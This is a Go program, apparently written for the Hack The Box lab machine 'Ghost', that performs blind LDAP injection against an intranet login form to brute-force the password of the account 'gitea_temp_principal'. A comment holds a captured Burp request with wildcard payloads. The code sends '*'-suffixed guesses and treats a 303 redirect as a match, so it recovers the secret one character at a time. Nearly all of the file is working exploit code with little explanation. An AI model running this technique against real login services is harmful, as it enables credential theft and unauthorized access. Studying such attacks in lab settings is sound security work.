package main

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

/**
Followed ippsec video on how to build the LDAP Injection program...
1. Loved how he enumerated and created the charset
2. Great explaination...

HTB: Ghost

Burp Suite Request
---------------------
POST /login HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Next-Action: c471eb076ccac91d6f828b671795550fd5925940
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Content-Length: 46
Connection: keep-alive

1_ldap-username=*&1_ldap-secret=*&0=[{},"$K1"]

**/

type LdapInjector struct {
	Url      string
	Username string
	Charset  string
}

func NewLdapInjector(url, username string) *LdapInjector {
	return &LdapInjector{
		Url:      url,
		Username: username,
		Charset:  CreateCharset(),
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Next-Action", "c471eb076ccac91d6f828b671795550fd5925940")

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == 303, nil
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		if ok, err := li.TestPassword(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
			return "", err
		} else if ok {
			return string(c), nil
		}
	}

	return "", nil
}

func (li *LdapInjector) Brute() (string, error) {
	var result string
	for {
		c, err := li.TestCharacter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			break
		}
		result += c
	}
	return result, nil
}

func (li *LdapInjector) PruneCharset() error {
	var newCharset string
	for _, char := range li.Charset {

		if ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(char))); err != nil {
			return nil
		} else if ok {
			newCharset += string(char)
		}
	}
	li.Charset = newCharset
	return nil
}

func CreateCharset() string {
	var charset string
	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}
	for i := range 10 {
		c := strconv.Itoa(i)
		charset += c
	}
	return charset
}

func main() {
	c := NewLdapInjector("http://intranet.ghost.htb:8008/login", "gitea_temp_principal")
	fmt.Println("Charset: ", c.Charset)
	c.PruneCharset()
	fmt.Println("New Charset: ", c.Charset)
	password, err := c.Brute()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Password: ", password)

}
